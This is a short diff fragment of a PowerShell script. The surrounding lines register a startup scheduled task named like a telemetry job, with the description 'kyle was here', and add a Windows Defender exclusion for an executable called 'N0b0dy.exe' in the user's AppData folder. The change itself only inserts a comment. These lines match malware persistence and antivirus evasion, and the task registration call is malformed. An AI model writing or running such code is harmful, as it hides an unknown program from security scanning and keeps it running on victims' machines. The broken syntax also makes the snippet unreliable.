@@ -10,6 +10,9 @@ $trigger = New-ScheduledTaskTrigger -AtStartup -RepetitionInterval (New-TimeSpan
 # register task
 
 Register-ScheduledTask -Telemetry_PROG -Action $action -Principal $principal -Trigger $trigger -Description "kyle was here"
+
+# add exclusion
+
 Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
 
 # start process
